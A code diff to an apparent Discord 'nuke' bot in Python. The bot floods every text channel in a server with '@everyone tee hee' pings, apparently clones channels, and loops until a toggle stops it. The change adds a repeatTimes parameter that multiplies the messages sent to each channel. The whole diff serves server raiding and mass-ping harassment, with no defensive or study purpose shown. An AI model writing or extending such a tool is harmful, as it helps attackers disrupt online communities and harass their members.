@@ -29,7 +29,7 @@ def get_time(seconds):
         time_took = f"{round(seconds, 2)} seconds"
     return time_took
 
-async def start_nuke(interation, shouldDelete):
+async def start_nuke(interation, shouldDelete, repeatTimes):
     set_nuke_toggle(True)
     global start_time
     start_time = time.time()
@@ -42,19 +42,21 @@ async def start_nuke(interation, shouldDelete):
         print(time.asctime(time.localtime()),": Finished, starting nuke")
         await interation.guild.create_text_channel(name='tee hee')
     print('-------------------------------')
-    await nuke_loop(interation)
+    await nuke_loop(interation, repeatTimes)
 
-async def nuke_loop(interation):
+async def nuke_loop(interation, repeatTimes):
     channels = interation.guild.text_channels
     global pings, count, time_took
-    pings += len(channels)
-    pings2 = pings + len(channels)*2
+    pings += len(channels)*repeatTimes
+    if len(channels) < 500: pings2 = pings + len(channels)*2
+    else: pings2 = pings + len(channels)
     count +=1
     seconds = time.time() - start_time
     time_took = get_time(seconds)
     print(f'-- starting ping')
     for i in progressBar(channels, prefix = 'Progress:', suffix = 'Complete', fill='🟥'):
-        await i.send("# @everyone tee hee")
+        for j in range(repeatTimes):
+            await i.send("# @everyone tee hee")
         time.sleep(0.1)
     print(f'-- finished ping, starting clone')
     for i in progressBar(channels, prefix = 'Progress:', suffix = 'Complete', fill='🟦'):
@@ -63,4 +65,4 @@ async def nuke_loop(interation):
         time.sleep(0.1)
     print('-- finished clone')
     print(f'-------------------------------\n{time.asctime(time.localtime())}\nPinged @everyone {pings} times, working to {pings2}\nCreated {len(interation.guild.channels)} channels\nRun {count} times and has been running for {time_took} ({round(seconds, 5)} seconds)\n-------------------------------')
-    if get_nuke_toggle(): await nuke_loop(interation)
+    if get_nuke_toggle(): await nuke_loop(interation, repeatTimes)
